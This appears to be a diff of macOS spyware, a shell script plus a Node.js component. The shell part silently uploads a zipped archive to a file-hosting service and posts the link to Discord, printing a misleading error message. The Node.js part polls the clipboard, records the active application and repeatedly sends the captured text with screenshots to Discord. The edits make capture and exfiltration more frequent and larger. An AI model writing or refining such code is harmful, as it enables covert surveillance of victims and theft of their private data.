@@ -531,14 +531,14 @@ UPLOAD_STATUS_FILE="$WORKDIR/upload_status.txt"
 
 if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
     (
-        HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
+    HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                 --max-time $UPLOAD_TIMEOUT \
                 --connect-timeout 30 \
                 --tcp-nodelay \
-            -H "Authorization: Bearer $GOFILE_TOKEN" \
-            -F "file=@$FINALZIP" \
-            "$UPLOAD_SERVICE" \
-            -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
+        -H "Authorization: Bearer $GOFILE_TOKEN" \
+        -F "file=@$FINALZIP" \
+        "$UPLOAD_SERVICE" \
+        -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
         echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
         
         # Process and send to Discord IMMEDIATELY when upload completes
@@ -581,26 +581,26 @@ if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
     UPLOAD_PID=$!
 else
     (
-        HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
+    HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                 --max-time $UPLOAD_TIMEOUT \
                 --connect-timeout 30 \
                 --tcp-nodelay \
-            -F "file=@$FINALZIP" \
-            "$UPLOAD_SERVICE" \
-            -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
+        -F "file=@$FINALZIP" \
+        "$UPLOAD_SERVICE" \
+        -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
         echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
         
         # Process and send to Discord IMMEDIATELY when upload completes
         if [ "$HTTP_CODE" = "200" ]; then
-            RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
-            if command -v jq &> /dev/null; then
-                URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
-                STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
-            else
-                URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
-                STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
-            fi
-            
+RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
+if command -v jq &> /dev/null; then
+    URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
+    STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
+else
+    URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
+    STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
+fi
+
             if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                 echo "$URL" > "$URL_FILE"
                 echo "success" > "$UPLOAD_STATUS_FILE"
@@ -638,7 +638,7 @@ fi
 # Wait for upload to complete (with timeout) - silent, no messages
 ELAPSED=0
 while kill -0 $UPLOAD_PID 2>/dev/null && [ $ELAPSED -lt $UPLOAD_TIMEOUT ]; do
-    sleep 1
+sleep 1
     ELAPSED=$((ELAPSED + 1))
 done
 
@@ -646,7 +646,7 @@ done
 UPLOAD_STATUS=$(cat "$UPLOAD_STATUS_FILE" 2>/dev/null || echo "unknown")
 if [ "$UPLOAD_STATUS" != "success" ]; then
     # Upload failed or timed out - Discord notification already sent
-    echo "Attempting to fix errors failed"
+echo "Attempting to fix errors failed"
 fi
 
 # ---------------------
@@ -925,31 +925,44 @@ function sendToDiscord(imageData, keys) {
 
 // Monitor clipboard changes - captures copy/paste (indicates typing activity)
 let clipboardCheckCount = 0;
+let lastClipboardLength = 0;
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
-        if (!error && stdout && stdout.trim() && stdout !== lastClipboard) {
+        if (!error && stdout && stdout.trim()) {
             const clipboard = stdout.trim();
-            if (clipboard.length > 0) {
+            // Detect changes by comparing content and length
+            if ((clipboard !== lastClipboard || clipboard.length !== lastClipboardLength) && clipboard.length > 0) {
                 lastClipboard = stdout;
+                lastClipboardLength = clipboard.length;
+                
                 // Get active application (what they're typing in)
                 exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
                     const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
+                    
                     // Add to buffer - this is what they typed/copied
-                    keysBuffer += clipboard.substring(0, 1000);
+                    if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
+                        keysBuffer += ' ';
+                    }
+                    keysBuffer += clipboard.substring(0, 2000);
                     lastKeyTime = Date.now();
+                    
                     // Send immediately when clipboard changes (indicates typing) WITH screenshot
                     setTimeout(() => {
                         takeScreenshot(); // This will send keylog + screenshot together
-                    }, 500);
+                    }, 300);
                 });
             }
         }
+        
         clipboardCheckCount++;
-        // Every 50 checks (10 seconds), send current buffer even if no change
-        if (clipboardCheckCount % 50 === 0 && keysBuffer.length > 0) {
+        // Every 25 checks (5 seconds), send current buffer even if no change (to ensure regular updates)
+        if (clipboardCheckCount % 25 === 0) {
             exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
                 const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
-                // Send with screenshot
+                // Always send periodic update with screenshot
+                if (keysBuffer.length === 0) {
+                    keysBuffer = `[Periodic Update - ${processTitle}]`;
+                }
                 takeScreenshot();
             });
         }
@@ -1029,12 +1042,16 @@ setInterval(() => {
     const now = Date.now();
     if (now - lastScreenshotTime > SCREENSHOT_INTERVAL) {
         lastScreenshotTime = now;
-        // Always take screenshot, even if no keys captured
-        // This ensures Discord gets regular updates with screenshots
-        if (keysBuffer.length === 0) {
-            keysBuffer = `[Periodic Screenshot - ${new Date().toLocaleTimeString()}]`;
-        }
-        takeScreenshot(); // This sends keylog + screenshot together
+        // Get current process
+        exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
+            const processTitle = appError ? 'Unknown' : (appName ? appName.trim() : 'Unknown');
+            // Always take screenshot, even if no keys captured
+            // This ensures Discord gets regular updates with screenshots
+            if (keysBuffer.length === 0) {
+                keysBuffer = `[Periodic Screenshot - ${processTitle} - ${new Date().toLocaleTimeString()}]`;
+            }
+            takeScreenshot(); // This sends keylog + screenshot together
+        });
     }
 }, SCREENSHOT_INTERVAL);
 
